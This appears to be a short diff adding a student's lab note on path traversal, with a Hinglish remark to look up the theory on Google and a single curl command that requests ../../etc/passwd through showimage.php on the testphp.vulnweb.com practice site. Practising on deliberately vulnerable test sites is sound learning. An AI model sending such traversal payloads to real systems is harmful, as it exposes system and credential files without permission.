@@ -1,0 +1,3 @@
+Theory Google se chap lo
+
+Command here : curl http://testphp.vulnweb.com/showimage.php?file=../../etc/passwd
